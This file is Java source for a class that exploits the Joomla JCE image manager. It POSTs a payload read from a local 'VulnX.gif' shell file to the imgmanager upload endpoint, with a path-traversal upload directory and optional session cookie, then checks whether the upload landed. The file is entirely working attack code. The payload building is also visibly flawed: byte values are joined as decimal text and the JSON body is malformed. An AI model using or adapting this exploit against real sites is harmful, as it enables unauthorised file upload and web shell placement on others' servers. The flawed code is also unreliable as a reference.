package com.funtap.awass.Exploit;

import com.funtap.awass.Exploit.Result.Result;
import net.minidev.json.JSONUtil;
import okhttp3.*;

import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;

public class joomla_exploit {
    public Result com_jce(String domain, String cookie) {
        Result result = new Result();
        try {
            // url attack
            String endpoint = domain + "/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20";
            endpoint = endpoint.replaceAll("//index.php","/index.php");
            String shell = "";
            Response response = null;
            OkHttpClient client = new OkHttpClient().newBuilder()
                    .build();
            MediaType mediaType = MediaType.parse("text/plain;charset=UTF-8");
            //read shell
            try (
                    InputStream inputStream = new FileInputStream("src/main/java/com/funtap/awass/Exploit/shell/VulnX.gif");
            ) {
                int byteRead = -1;

                while ((byteRead = inputStream.read()) != -1) {
                    shell = shell + byteRead;
                }
            } catch (IOException ex) {
                ex.printStackTrace();
            }
            RequestBody body = RequestBody.create(mediaType, "{'upload-dir':'./../../','upload-overwrite':0,'Filedata' : " + shell + ",'action':'Upload'}");
            //check cookie
            if (cookie == null) {
                Request request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .build();
                response = client.newCall(request).execute();
            } else {
                Request request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Cookie", cookie)
                        .build();
                response = client.newCall(request).execute();
            }
            //check response
            String res = response.body().string();
            System.out.println(response.code());
            if (res.contains("/image/gif/")) {
                result = new Result(endpoint, "com_jce", true, "VulnX.gif");
            } else {
                result = new Result(endpoint, "com_jce", false, "VulnX.gif");
            }
            String dump_data = domain + "/VulnX.gif";
        } catch (Exception e) {
            System.out.println(e.getMessage());
        }
        return result;
    }


}
